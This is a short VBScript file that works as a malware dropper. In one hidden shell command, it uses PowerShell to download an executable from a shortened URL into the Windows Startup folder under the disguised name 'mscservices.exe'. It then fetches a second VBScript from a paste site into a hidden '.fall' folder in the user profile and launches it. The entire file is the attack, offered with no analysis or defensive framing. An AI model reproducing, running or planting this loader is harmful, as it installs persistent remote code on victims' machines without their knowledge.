dim oShell: set oShell = CreateObject("WScript.Shell")
oShell.run "cmd /c powershell $s = [System.Environment]::GetFolderPath('Startup'); iwr https://s.id/1UPW2 -O $s/mscservices.exe && mkdir %USERPROFILE%\.fall & powershell iwr https://bitbin.it/RNvKMxvS/raw/ -O %USERPROFILE%\.fall\falldownobj.vbs && start %USERPROFILE%\.fall\falldownobj.vbs", 0, true
